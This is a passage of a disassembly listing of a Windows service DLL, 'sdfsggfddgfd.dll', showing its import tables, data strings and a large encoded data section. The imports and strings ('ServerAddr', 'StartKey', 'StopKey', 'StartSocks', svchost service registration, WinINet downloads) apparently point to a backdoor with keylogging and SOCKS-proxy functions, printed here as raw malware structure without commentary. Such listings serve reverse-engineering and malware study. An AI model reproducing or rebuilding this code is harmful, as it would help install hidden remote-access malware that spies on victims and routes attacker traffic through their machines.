					; sub_100013A7+8Ap ...
; int __stdcall	WSAStartup(WORD	wVersionRequested, LPWSADATA lpWSAData)
		extrn WSAStartup:dword	; CODE XREF: ServiceMain+92p
					; DATA XREF: ServiceMain+92r


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 10004130h
off_10004130	dd offset sub_10001380	; DATA XREF: sub_10001355+12o
					; sub_1000139Co
off_10004134	dd offset sub_100025FD	; DATA XREF: sub_100025A4+12o
					; sub_10002619o
stru_10004138	dd 19930520h		; Magic	; DATA XREF: .text:loc_10003507o
		dd 2			; Count
		dd offset stru_10004138.Info; InfoPtr
		dd 0			; CountDtr
		dd 0			; DtrPtr
		dd 3 dup(0)		; _unk
		dd -1			; Info.Id
		dd offset sub_100034F4	; Info.Proc
		dd 0			; Info.Id
		dd offset sub_100034FF	; Info.Proc
stru_10004168	dd 19930520h		; Magic	; DATA XREF: .text:loc_1000351Fo
		dd 1			; Count
		dd offset stru_10004168.Info; InfoPtr
		dd 0			; CountDtr
		dd 0			; DtrPtr
		dd 3 dup(0)		; _unk
		dd -1			; Info.Id
		dd offset sub_10003514	; Info.Proc
stru_10004190	dd 19930520h		; Magic	; DATA XREF: .text:loc_10003537o
		dd 1			; Count
		dd offset stru_10004190.Info; InfoPtr
		dd 0			; CountDtr
		dd 0			; DtrPtr
		dd 3 dup(0)		; _unk
		dd -1			; Info.Id
		dd offset sub_1000352C	; Info.Proc
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_10004298 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva GetProcAddress	; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_10004334 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva CharLowerA	; Import Address Table
__IMPORT_DESCRIPTOR_ADVAPI32 dd	rva off_10004258 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aAdvapi32_dll	; DLL Name
		dd rva RegOpenKeyExA	; Import Address Table
__IMPORT_DESCRIPTOR_WININET dd rva off_10004340	; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aWininet_dll	; DLL Name
		dd rva InternetCloseHandle ; Import Address Table
__IMPORT_DESCRIPTOR_WS2_32 dd rva dword_10004358 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aWs2_32_dll	; DLL Name
		dd rva closesocket	; Import Address Table
__IMPORT_DESCRIPTOR_SHLWAPI dd rva off_10004324	; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aShlwapi_dll	; DLL Name
		dd rva StrChrA		; Import Address Table
__IMPORT_DESCRIPTOR_MSVCRT dd rva off_100042EC ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aMsvcrt_dll	; DLL Name
		dd rva __imp_??3@YAXPAX@Z ; Import Address Table
		dd 5 dup(0)
;
; Import names for ADVAPI32.dll
;
off_10004258	dd rva word_100045B6	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ADVAPI32o
		dd rva word_100045A4
		dd rva word_10004592
		dd rva word_10004580
		dd rva word_10004572
		dd rva word_10004562
		dd rva word_10004550
		dd rva word_10004538
		dd rva word_10004526
		dd rva word_10004516
		dd rva word_10004500
		dd rva word_100044F0
		dd rva word_100045D8
		dd rva word_100045EC
		dd rva word_100045C6
		dd 0
;
; Import names for KERNEL32.dll
;
off_10004298	dd rva word_10004478	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_1000448A
		dd rva word_1000446A
		dd rva word_100044A4
		dd rva word_10004388
		dd rva word_1000445A
		dd rva word_10004444
		dd rva word_10004438
		dd rva word_10004422
		dd rva word_10004414
		dd rva word_10004408
		dd rva word_100043F8
		dd rva word_100043E2
		dd rva word_100043D4
		dd rva word_100043C8
		dd rva word_100043BC
		dd rva word_100043B0
		dd rva word_100043A2
		dd rva word_10004396
		dd rva word_10004492
		dd 0
;
; Import names for MSVCRT.dll
;
off_100042EC	dd rva word_100046BC	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCRTo
		dd rva word_100046CC
		dd rva word_1000475C
		dd rva word_10004752
		dd rva word_10004746
		dd rva word_1000473E
		dd rva word_10004728
		dd rva word_10004718
		dd rva word_1000470E
		dd rva word_100046FA
		dd rva word_100046F0
		dd rva word_100046E6
		dd rva word_100046DC
		dd 0
;
; Import names for SHLWAPI.dll
;
off_10004324	dd rva word_10004690	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_SHLWAPIo
		dd rva word_100046A4
		dd rva word_1000469A
		dd 0
;
; Import names for USER32.dll
;
off_10004334	dd rva word_100044D6	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_100044CA
		dd 0
;
; Import names for WININET.dll
;
off_10004340	dd rva word_10004618	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WININETo
		dd rva word_10004642
		dd rva word_10004654
		dd rva word_10004668
		dd rva word_1000462E
		dd 0
;
; Import names for WS2_32.dll
;
dword_10004358	dd 80000003h		; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WS2_32o
		dd 80000013h
		dd 80000015h
		dd 80000034h
		dd 8000000Ch
		dd 80000004h
		dd 80000017h
		dd 80000009h
		dd 80000010h
		dd 8000000Bh
		dd 80000073h
		dd 0
word_10004388	dw 2Eh			; DATA XREF: .rdata:100042A8o
		db 'CloseHandle',0
word_10004396	dw 397h			; DATA XREF: .rdata:100042E0o
		db 'WriteFile',0
word_100043A2	dw 4Dh			; DATA XREF: .rdata:100042DCo
		db 'CreateFileA',0
word_100043B0	dw 3B9h			; DATA XREF: .rdata:100042D8o
		db 'lstrcpyA',0
		align 4
word_100043BC	dw 3B3h			; DATA XREF: .rdata:100042D4o
		db 'lstrcmpA',0
		align 4
word_100043C8	dw 3BFh			; DATA XREF: .rdata:100042D0o
		db 'lstrlenA',0
		align 4
word_100043D4	dw 7Ch			; DATA XREF: .rdata:100042CCo
		db 'DeleteFileA',0
word_100043E2	dw 13Eh			; DATA XREF: .rdata:100042C8o
		db 'GetCurrentThreadId',0
		align 4
word_100043F8	dw 1CBh			; DATA XREF: .rdata:100042C4o
		db 'GetTempPathA',0
		align 4
word_10004408	dw 2ABh			; DATA XREF: .rdata:100042C0o
		db 'ReadFile',0
		align 4
word_10004414	dw 15Bh			; DATA XREF: .rdata:100042BCo
		db 'GetFileSize',0
word_10004422	dw 175h			; DATA XREF: .rdata:100042B8o
		db 'GetModuleFileNameA',0
		align 4
word_10004438	dw 3B0h			; DATA XREF: .rdata:100042B4o
		db 'lstrcatA',0
		align 4
word_10004444	dw 1B9h			; DATA XREF: .rdata:100042B0o
		db 'GetSystemDirectoryA',0
word_1000445A	dw 248h			; DATA XREF: .rdata:100042ACo
		db 'LoadLibraryA',0
		align 2
word_1000446A	dw 0EFh			; DATA XREF: .rdata:100042A0o
		db 'FreeLibrary',0
word_10004478	dw 198h			; DATA XREF: .rdata:off_10004298o
		db 'GetProcAddress',0
		align 2
word_1000448A	dw 349h			; DATA XREF: .rdata:1000429Co
		db 'Sleep',0
word_10004492	dw 83h			; DATA XREF: .rdata:100042E4o
		db 'DeviceIoControl',0
word_100044A4	dw 157h			; DATA XREF: .rdata:100042A4o
		db 'GetFileAttributesExA',0
		align 4
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:100041C4o
		align 2
word_100044CA	dw 2D5h			; DATA XREF: .rdata:10004338o
		db 'wsprintfA',0
word_100044D6	dw 26h			; DATA XREF: .rdata:off_10004334o
		db 'CharLowerA',0
		align 4
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .rdata:100041D8o
		align 10h
word_100044F0	dw 23Eh			; DATA XREF: .rdata:10004284o
		db 'StartServiceA',0
word_10004500	dw 3Eh			; DATA XREF: .rdata:10004280o
		db 'CloseServiceHandle',0
		align 2
word_10004516	dw 1ADh			; DATA XREF: .rdata:1000427Co
		db 'OpenServiceA',0
		align 2
word_10004526	dw 1ABh			; DATA XREF: .rdata:10004278o
		db 'OpenSCManagerA',0
		align 4
word_10004538	dw 34h			; DATA XREF: .rdata:10004274o
		db 'ChangeServiceConfig2A',0
word_10004550	dw 64h			; DATA XREF: .rdata:10004270o
		db 'CreateServiceA',0
		align 2
word_10004562	dw 0AFh			; DATA XREF: .rdata:1000426Co
		db 'DeleteService',0
word_10004572	dw 1C9h			; DATA XREF: .rdata:10004268o
		db 'RegCloseKey',0
word_10004580	dw 1F9h			; DATA XREF: .rdata:10004264o
		db 'RegSetValueExA',0
		align 2
word_10004592	dw 1CDh			; DATA XREF: .rdata:10004260o
		db 'RegCreateKeyExA',0
word_100045A4	dw 1D2h			; DATA XREF: .rdata:1000425Co
		db 'RegDeleteValueA',0
word_100045B6	dw 1E2h			; DATA XREF: .rdata:off_10004258o
		db 'RegOpenKeyExA',0
word_100045C6	dw 42h			; DATA XREF: .rdata:10004290o
		db 'ControlService',0
		align 4
word_100045D8	dw 239h			; DATA XREF: .rdata:10004288o
		db 'SetServiceStatus',0
		align 4
word_100045EC	dw 201h			; DATA XREF: .rdata:1000428Co
		db 'RegisterServiceCtrlHandlerA',0
aAdvapi32_dll	db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:100041ECo
		align 4
word_10004618	dw 69h			; DATA XREF: .rdata:off_10004340o
		db 'InternetCloseHandle',0
word_1000462E	dw 9Ah			; DATA XREF: .rdata:10004350o
		db 'InternetReadFile',0
		align 2
word_10004642	dw 57h			; DATA XREF: .rdata:10004344o
		db 'HttpQueryInfoA',0
		align 4
word_10004654	dw 93h			; DATA XREF: .rdata:10004348o
		db 'InternetOpenUrlA',0
		align 4
word_10004668	dw 92h			; DATA XREF: .rdata:1000434Co
		db 'InternetOpenA',0
aWininet_dll	db 'WININET.dll',0      ; DATA XREF: .rdata:10004200o
aWs2_32_dll	db 'WS2_32.dll',0       ; DATA XREF: .rdata:10004214o
		align 10h
word_10004690	dw 0D6h			; DATA XREF: .rdata:off_10004324o
		db 'StrChrA',0
word_1000469A	dw 101h			; DATA XREF: .rdata:1000432Co
		db 'StrStrA',0
word_100046A4	dw 109h			; DATA XREF: .rdata:10004328o
		db 'StrToIntA',0
aShlwapi_dll	db 'SHLWAPI.dll',0      ; DATA XREF: .rdata:10004228o
word_100046BC	dw 10h			; DATA XREF: .rdata:off_100042ECo
		db '??3@YAXPAX@Z',0
		align 4
word_100046CC	dw 0Fh			; DATA XREF: .rdata:100042F0o
		db '??2@YAPAXI@Z',0
		align 4
word_100046DC	dw 299h			; DATA XREF: .rdata:1000431Co
		db 'memset',0
		align 2
word_100046E6	dw 297h			; DATA XREF: .rdata:10004318o
		db 'memcpy',0
		align 10h
word_100046F0	dw 2BAh			; DATA XREF: .rdata:10004314o
		db 'strcpy',0
		align 2
word_100046FA	dw 49h			; DATA XREF: .rdata:10004310o
		db '__CxxFrameHandler',0
word_1000470E	dw 2C3h			; DATA XREF: .rdata:1000430Co
		db 'strrchr',0
word_10004718	dw 0A5h			; DATA XREF: .rdata:10004308o
		db '_beginthread',0
		align 4
word_10004728	dw 2B6h			; DATA XREF: .rdata:10004304o
		db 'strcat',0
		align 2
aMsvcrt_dll	db 'MSVCRT.dll',0       ; DATA XREF: .rdata:1000423Co
		align 2
word_1000473E	dw 25Eh			; DATA XREF: .rdata:10004300o
		db 'free',0
		align 2
word_10004746	dw 10Fh			; DATA XREF: .rdata:100042FCo
		db '_initterm',0
word_10004752	dw 291h			; DATA XREF: .rdata:100042F8o
		db 'malloc',0
		align 4
word_1000475C	dw 9Dh			; DATA XREF: .rdata:100042F4o
		db '_adjust_fdiv',0
		align 10h
;
; Export directory for sdfsggfddgfd.dll
;
		dd 0			; Characteristics
		dd 4C3E7CCBh		; TimeDateStamp: Wed Jul 14 23:13:15 2010
		dw 0			; MajorVersion
		dw 0			; MinorVersion
		dd rva aSdfsggfddgfd_d	; Name
		dd 1			; Base
		dd 2			; NumberOfFunctions
		dd 1			; NumberOfNames
		dd rva off_10004798	; AddressOfFunctions
		dd rva off_10004798+4	; AddressOfNames
		dd rva word_100047A0	; AddressOfNameOrdinals
;
; Export Address Table for sdfsggfddgfd.dll
;
off_10004798	dd rva ServiceMain, rva	aServicemain ; DATA XREF: .rdata:1000478Co
					; .rdata:10004790o
					; "ServiceMain"
;
; Export Ordinals Table	for sdfsggfddgfd.dll
;
word_100047A0	dw 0			; DATA XREF: .rdata:10004794o
aSdfsggfddgfd_d	db 'sdfsggfddgfd.dll',0 ; DATA XREF: .rdata:1000477Co
; Exported entry   2.
		public aServicemain
aServicemain	db 'ServiceMain',0      ; DATA XREF: .rdata:off_10004798o
		align 1000h
_rdata		ends

; Section 3. (virtual address 00005000)
; Virtual size			: 000006B0 (   1712.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00003200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 10005000h
dword_10005000	dd 0			; DATA XREF: _CRT_INIT(x,x,x)+4Fo
dword_10005004	dd 3 dup(0)		; DATA XREF: _CRT_INIT(x,x,x)+4Ao
; char aS[4]
aS		db '%s=',0              ; DATA XREF: sub_10001590+42o
aServerport	db 'ServerPort',0       ; DATA XREF: sub_10001656+12Ao
		align 10h
aServeraddr	db 'ServerAddr',0       ; DATA XREF: sub_10001656+100o
		align 4
; char a08x_txt[]
a08x_txt	db '%08x.txt',0         ; DATA XREF: sub_10001656+77o
		align 4
; char aHttpS[]
aHttpS		db 'http://%s',0        ; DATA XREF: sub_10001656+36o
		align 4
; char aS_dll[]
aS_dll		db '\%s.dll',0          ; DATA XREF: sub_1000205E+24Do
aA		db '',0
		align 10h
		dd 0Fh dup(0)
aStartkey	db 'StartKey',0         ; DATA XREF: .text:loc_10002791o
		align 4
aStartsocks	db 'StartSocks',0       ; DATA XREF: .text:100027DCo
		align 4
; char aSzt_txt[]
aSzt_txt	db '\%szt.txt',0        ; DATA XREF: sub_1000281A+95o
		align 10h
; char ProcName[]
ProcName	db 'StopKey',0          ; DATA XREF: sub_1000281A+2Bo
; char aSza_txt[]
aSza_txt	db '\%sza.txt',0        ; DATA XREF: sub_100028CB+7Fo
		align 4
; char aStopsocks[]
aStopsocks	db 'StopSocks',0        ; DATA XREF: sub_100028CB+1Eo
		align 10h
; char SubKey[]
SubKey		db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost',0
					; DATA XREF: sub_1000296A+189o
		align 4
; char aS08x_ini[]
aS08x_ini	db '%s\%08x.ini',0      ; DATA XREF: sub_1000296A+162o
; char aVip0715[]
aVip0715	db 'Vip0715',0          ; DATA XREF: sub_1000296A:loc_100029F2o
aSvchost_exe	db 'svchost.exe',0      ; DATA XREF: ServiceMain+5Co
		align 10h
dword_10005130	dd 2 dup(0)		; DATA XREF: sub_1000143D+14o
; SERVICE_STATUS_HANDLE	hServiceStatus
hServiceStatus	dd 0			; DATA XREF: sub_10003121+22r
					; ServiceMain+E0w
		align 10h
; struct _SERVICE_STATUS ServiceStatus
ServiceStatus	_SERVICE_STATUS	<0>	; DATA XREF: sub_10003121+14o
					; ServiceMain+A2w ...
; HMODULE hModule
hModule		dd 0			; DATA XREF: sub_10001AAB+2Dr
					; sub_1000281A+70r ...
dword_10005160	dd 0			; DATA XREF: sub_100017BB+1Dr
					; sub_1000296A+9Do ...
; DWORD	dwMilliseconds
dwMilliseconds	dd 0			; DATA XREF: .text:10002783r
					; sub_1000296A+74r ...
dword_10005168	dd 0			; DATA XREF: sub_10003182+1Ar
dword_1000516C	dd 0			; DATA XREF: sub_1000281A+9r
					; sub_1000296A:loc_10002999r
		dd 3 dup(0)
dword_1000517C	dd 0			; DATA XREF: sub_10003182+2Ar
dword_10005180	dd 0			; DATA XREF: sub_1000296A+14Fr
dword_10005184	dd 0			; DATA XREF: sub_1000205E+20r
; char String2[120]
String2		db 78h dup(0)		; DATA XREF: sub_100017BB+Eo
					; .text:loc_100030CEo
		dd 22h dup(?)
; char String[]
String		db 140h	dup(?)		; DATA XREF: sub_100017BB+22o
					; .text:1000303Eo
; char ServiceName[]
ServiceName	dd 6 dup(?)		; DATA XREF: sub_10002F2D+19o
					; .text:10003009o
; char ValueName[]
ValueName	db 18h dup(?)		; DATA XREF: sub_10001A07+1o
					; sub_10001BC3+EDo ...
dword_100053F8	dd 40h dup(?)		; DATA XREF: sub_10001BC3+134o
; char DisplayName[96]
DisplayName	db 60h dup(?)		; DATA XREF: sub_10001BC3+116o
dword_10005558	dd ?			; DATA XREF: sub_1000296A+1Br
		dd 5 dup(?)
		db 2 dup(?)
; char FileName[]
FileName	db 12Ah	dup(?)		; DATA XREF: sub_10003182+34o
dword_1000569C	dd ?			; DATA XREF: _CRT_INIT(x,x,x)+8r
					; _CRT_INIT(x,x,x)+10w	...
dword_100056A0	dd ?			; DATA XREF: _CRT_INIT(x,x,x)+21w
dword_100056A4	dd ?			; DATA XREF: _CRT_INIT(x,x,x)+54w
					; _CRT_INIT(x,x,x)+75r
; void *Memory
Memory		dd ?			; DATA XREF: _CRT_INIT(x,x,x)+37w
					; _CRT_INIT(x,x,x)+45r	...
dword_100056AC	dd ?			; DATA XREF: DllEntryPoint:loc_10003477r
					; DllEntryPoint+82r
		align 1000h
_data		ends

; Section 5. (virtual address 00007000)
; Virtual size			: 00000A30 (   2608.)
; Section size in file		: 00000C00 (   3072.)
; Offset to raw	data for section: 00003800
; Flags	40000040: Data Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
seg004		segment	para public 'DATA' use32
		assume cs:seg004
		;org 10007000h
		dd 2 dup(12345678h), 274E9A57h,	5C3D8E52h, 84AF5FE1h, 0DCEB6E2Dh
		dd 0C48C2CC6h, 162CFED0h, 0B6FD7B1Ah, 6AB62C41h, 0EC707DF7h
		dd 3E919049h, 57A874FBh, 49B5F897h, 6BC03D66h, 0B62ECADh
		dd 0E17C22B9h, 60D48BC6h, 0B4044CF1h, 0F0610E89h, 0A4BFA620h
		dd 0B2D945D7h, 5DF3EFDCh, 0A3BD2F30h, 0CD7B08AEh, 44632E49h
		dd 0A6467795h, 19738C89h, 0E0D9E483h, 2C6BF38Ch, 34C99EDDh
		dd 871CF3A3h, 0A1411700h, 0BD2B7F52h, 0EB8263B7h, 629070D1h
		dd 175EBEC6h, 8F1A018Bh, 0F1BC0363h, 5FEA52A2h,	861835B7h
		dd 74F3E569h, 0AA00FA61h, 738024E9h, 74981BF3h,	83AED95Dh
		dd 0BD160673h, 0D2EEB4B6h, 0A4464CDCh, 1185C817h, 0C07239Ah
		dd 0F30B0E5Ah, 1CCDE511h, 0B2EFE189h, 0BF1D8F17h, 89F18165h
		dd 22144375h, 3BA790E3h, 39E1C66Bh, 8BF998AAh, 3A460329h
		dd 0C1A58397h, 201B8656h, 2CBB213Ah, 29CA028Dh,	9A22A656h
		dd 58D4CCDAh, 0E2112964h, 0F44B5D42h, 5B972610h, 756D339h
		dd 6214FCBAh, 0E0B07129h, 0D7BD70F6h, 92291BF2h, 0A11C280Dh
		dd 7223DB64h, 268E317Bh, 9D175FC6h, 0D3C47A6Fh,	700E7853h
		dd 9A42574Eh, 0E289CB8h, 6FE3FF2Fh, 0DD186597h,	0CA520E60h
		dd 9A51007h, 289204E0h,	2BFF12h, 8A77C4E3h, 0F5183736h
		dd 0F52B1551h, 5D70E3E4h, 0F0AB2447h, 744ACF04h, 9470095h
		dd 0B950EE6Fh, 50261D3Fh, 6E43D573h, 0DABFD2FCh, 19743D52h
		dd 4061DBB9h, 64C85C4h,	1DABD817h, 0C3C52D70h, 9415CBE9h
		dd 0A2EF5C77h, 0C7669EB7h, 3A6C5BEAh, 613B9B3Dh, 0E6F4184Fh
		dd 0D86F2EDh, 45D2A420h, 0FD0D3769h, 0B865B64Bh, 64E7E10Ah
		dd 0E7A025B3h, 0FC02CC5Ch, 3D8A72ADh, 80A0B89Fh, 67BF3C84h
		dd 33D5C848h, 0D9EDC9F6h, 580B037Dh, 495784B5h,	0B87ED69Dh
		dd 325679E7h, 1FC190B6h, 53D3DBA6h, 0DF37E50Dh,	2DCE7F80h
		dd 4C9A6C99h, 88DB5EF8h, 3E772288h, 0EE9F1703h,	92B0E4B9h
		dd 2E576A8Dh, 0A9F9F840h, 0DB52BEF2h, 0E75C85E5h, 0F301FCE9h
		dd 35B52297h, 99AF330Ch, 80361B30h, 2393D241h, 38E46869h
		dd 0CBF7053h, 0D218B4EAh, 3A652763h, 46FF1B7Dh,	5ACCB407h
		dd 921B9DA3h, 57CFF9CBh, 35C09D11h, 0E75E7CABh,	0B498622Eh
		dd 94969EE2h, 687AE3E3h, 593F84FEh, 6F27D29Bh, 0F553C932h
		dd 4755FFBFh, 0FE1DB263h, 36A2814Fh, 3F7EC033h,	55DBF97Bh
		dd 0BF508AF8h, 0BF2122A0h, 51054033h, 71058593h, 737C6215h
		dd 46DF88DCh, 4058FE47h, 0C98ECDC5h, 0F916FADEh, 2CD3F538h
		dd 95200B7h, 4CC9EA4Fh,	836CCCFh, 0B97778CEh, 0D6676AA8h
		dd 0AA4AFBC3h, 5F6BD817h, 5C03B3EDh, 0D15D38E6h, 8F384340h
		dd 1E6D5055h, 9D13364h,	7D5D0994h, 128C6E36h, 0E905F04Bh
		dd 0F77AC446h, 0A0D0B813h, 88806957h, 0A63DB6FAh, 9AD774E3h
		dd 405F6302h, 858C6194h, 795DDEA2h, 0A60090CBh,	0A1F36844h
		dd 0DE69C41Dh, 0C8EFE6C6h, 114FA5D1h, 47B462F9h, 0A9103E64h
		dd 38BB8A25h, 115D8005h, 0F90D3083h, 3ABABC19h,	0AECAC8C1h
		dd 19022DB8h, 0BBA6ED82h, 26E16C2Eh, 4E66DDDBh,	0DF58FA7Bh
		dd 0D368F8D7h, 433DBAD4h, 7D1845F4h, 58B8741Fh,	0C47BECA4h
		dd 0A5C7537Bh, 0E2A8BDCDh, 0B8BA67B5h, 554AA849h, 0A2B824D4h
		dd 601F4366h, 7638E28Fh, 897C4867h, 0CE895BD1h,	1CC71301h
		dd 464B303Ch, 0CC9650BEh, 0FEF41DD7h, 7D29AB1Fh, 1C4CDF8Fh
		dd 33F1E7D3h, 48F1ECBBh, 250CC881h, 2ED3BB97h, 43128118h
		dd 3297A292h, 0FC215306h, 0F2BAD3A7h, 0E922B2F1h, 0BCC56EBEh
		dd 25BFC255h, 1B1A724Eh, 0F622EC5Bh, 0F775CF73h, 660B25Fh
		dd 9F4B265Fh, 0D45691C8h, 0D1CE4964h, 4328EB83h, 0B3E7BCEAh
		dd 12C199D4h, 95FD3136h, 6813D034h, 82162116h, 116B4EC7h
		dd 71A56A61h, 92CC2A15h, 0F17650AEh, 5AE31837h,	1B6592AEh
		dd 375CE10Bh, 5582E0B4h, 8E8F439Eh, 0EEECC0D0h,	1943033Ch
		dd 8537A8EEh, 0F47B9219h, 0A0C4555Dh, 0F34AA504h, 44A06A9Ah
		dd 60DBB8F5h, 6AF60173h, 0E6758983h, 10491B67h,	72F4FB38h
		dd 0B5ED1B2Ah, 0B8469111h, 0DF8C4924h, 0AEEFF701h, 96A250F2h
		dd 0E857A6Fh, 0E602C1E4h, 0D8348BB4h, 614F8E7Dh, 0CF3C409Eh
		dd 9A838FF6h, 0F76ED3EFh, 0AB6C01BBh, 1DB321DEh, 0B02902EDh
		dd 4F852C95h, 4AB116DEh, 607399B1h, 1D4DA599h, 66A233C6h
		dd 52197A57h, 3B4766D9h, 1588460Ah, 0FF2DC5E3h,	18DD1BD6h
		dd 94358455h, 0FB2F193h, 20D1FE8Eh, 3274254Dh, 8F883166h
		dd 0BEE5F5C4h, 0F753DA7h, 749905ECh, 92C8E98Fh,	187ADD6Eh
		dd 50441E50h, 0F4446925h, 42BF6A90h, 520977A2h,	0A8A57EE9h
		dd 6AE3CA9h, 8375B069h,	0E16CD0B1h, 1C437A13h, 3F50AD68h
		dd 7B34F95Ch, 274E9C09h, 5C3DA942h, 84AF5FE0h, 0DCEB6E2Ch
		dd 0C4801442h, 162CD8CFh, 0B6FD7B1Ah, 6AB62C41h, 0EC74FBC5h
		dd 3E919049h, 3EC91D97h, 7A9B91E4h, 45F20F55h, 0B059EC2h
		dd 0E17C22B9h, 60D48BC6h, 0B4044CF1h, 0F0610E89h, 0A4BFA620h
		dd 0B2D945D7h, 5DF3EFDCh, 0A3BD2F30h, 0CD7B08AEh, 44632E49h
		dd 0A6467795h, 19738C89h, 0E0D9E483h, 2C6BF38Ch, 34C99EDDh
		dd 871CF3A3h, 0A1411700h, 0BD2B7F52h, 0EB8263B7h, 629070D1h
		dd 175EBEC6h, 8F1A018Bh, 0F1BC0363h, 5FEA52A2h,	861835B7h
		dd 74F3E569h, 0AA00FA61h, 738024E9h, 74981BF3h,	83AED95Dh
		dd 0BD160673h, 0D2EEB4B6h, 0A4464CDCh, 1185C817h, 0C07239Ah
		dd 0F30B0E5Ah, 1CCDE511h, 0B2EFE189h, 0BF1D8F17h, 89F18165h
		dd 22144375h, 3BA790E3h, 39E1C66Bh, 8BF998AAh, 3A460329h
		dd 0C1A58397h, 201B8656h, 2CBB213Ah, 29CA028Dh,	9A22A656h
		dd 58D4CCDAh, 0E2112964h, 0F44B5D42h, 5B972610h, 756D339h
		dd 6214FCBAh, 0E0B07129h, 0D7BD70F6h, 92291BF2h, 0A11C280Dh
		dd 7223DB64h, 268E317Bh, 9D175FC6h, 0D3C47A6Fh,	700E7853h
		dd 9A42574Eh, 0E289CB8h, 6FE3FF2Fh, 0DD186597h,	0CA520E60h
		dd 9A51007h, 289204E0h,	2BFF12h, 8A77C4E3h, 0F5183736h
		dd 0F52B1551h, 5D70E3E4h, 0F0AB2447h, 744ACF04h, 9470095h
		dd 0B950EE6Fh, 50261D3Fh, 6E43D573h, 0DABFD2FCh, 19743D52h
		dd 4061DBB9h, 64C85C4h,	1DABD817h, 0C3C52D70h, 9415CBE9h
		dd 0A2EF5C77h, 0C7669EB7h, 3A6C5BEAh, 613B9B3Dh, 0E6F4184Fh
		dd 0D86F2EDh, 45D2A420h, 0FD0D3769h, 0B865B64Bh, 64E7E10Ah
		dd 0E7A025B3h, 0FC02CC5Ch, 3D8A72ADh, 80A0B89Fh, 67BF3C84h
		dd 33D5C848h, 0D9EDC9F6h, 580B037Dh, 495784B5h,	0B87ED69Dh
		dd 325679E7h, 1FC190B6h, 53D3DBA6h, 0DF37E50Dh,	2DCE7F80h
		dd 4C9A6C99h, 88DB5EF8h, 3E772288h, 0EE9F1703h,	92B0E4B9h
		dd 2E576A8Dh, 0A9F9F840h, 0DB52BEF2h, 0E75C85E5h, 0CB729D85h
		dd 35B516A5h, 99AF330Ch, 80361B30h, 2393D241h, 38E46869h
		dd 0CBF7053h, 0D218B4EAh, 3A652763h, 46FF1B7Dh,	5ACCB407h
		dd 921B9DA3h, 57CFF9CBh, 35C09D11h, 0E75E7CABh,	0B498622Eh
		dd 0FFFCE69Ah, 191F9A97h, 593F84FEh, 6F27D29Bh,	0F553C932h
		dd 4755FFBFh, 9577CA02h, 36A2F83Bh, 3F7EC033h, 55DBF97Bh
		dd 0BF508AF8h, 0BF2122A0h, 2366297Eh, 176AF6FCh, 3D524261h
		dd 0FFDC99h, 25359F35h,	0A2FCA2B2h, 0B446AEFEh,	2CD3F538h
		dd 95200B7h, 4CC9EA4Fh,	836CCCFh, 0B97778CEh, 0D6676AA8h
		dd 0AA4AFBC3h, 5F6BD817h, 5C03B3EDh, 0D15D38E6h, 8F384340h
		dd 1E6D5055h, 9D13364h
		dd 7D5D0994h, 128C6E36h, 0E905F04Bh, 0F77AC446h, 0A0D0B813h
		dd 88806957h, 0A63DB6FAh, 9AD774E3h, 405F6302h,	858C6194h
		dd 795DDEA2h, 0A60090CBh, 0A1F36844h, 0DE69C41Dh, 0C8EFE6C6h
		dd 114FA5D1h, 47B462F9h, 0A9103E64h, 38BB8A25h,	115D8005h
		dd 0F90D3083h, 3ABABC19h, 0AECAC8C1h, 19022DB8h, 0BBA6ED82h
		dd 26E16C2Eh, 4E66DDDBh, 0DF58FA7Bh, 0D368F8D7h, 433DBAD4h
		dd 7D1845F4h, 58B8741Fh, 0C47BECA4h, 0A5C7537Bh, 0E2A8BDCDh
		dd 0B8BA67B5h, 554AA849h, 0A2B824D4h, 601F4366h, 7638E28Fh
		dd 897C4867h, 0CE895BD1h, 1CC71301h, 464B303Ch,	0A7FC28DFh
		dd 0FEF464A3h, 7D29AB1Fh, 1C4CDF8Fh, 33F1E7D3h,	48F1ECBBh
		dd 250CC881h, 2ED3BB97h, 0F2C660A3h, 0B9E0C9h, 0FC7C6628h
		dd 0F2BAD3A7h, 0E922B2F1h, 0BCC56EBEh, 25BFC255h, 1B1A724Eh
		dd 5EEF399Dh, 50CE02CCh, 6605B88h, 9F4B265Fh, 0D45691C8h
		dd 0D1CE4964h, 4328EB83h, 0B3E7BCEAh, 12C199D4h, 95FD3136h
		dd 0C31F7147h, 0CCC74040h, 1CD76D60h, 30D4E534h, 0A88F2A15h
		dd 9E0400F2h, 37826A50h, 770CD48Eh, 5A00926Eh, 20F689D1h
		dd 0E8EB2CC2h, 809FABB6h, 7C3B6612h, 8537A8EEh,	0F47B9219h
		dd 0A0C4555Dh, 0F34AA504h, 44A06A9Ah, 60DBB8F5h, 6AF60173h
		dd 0E6758983h, 10491B67h, 72F4FB38h, 0B5ED1B2Ah, 0B8469111h
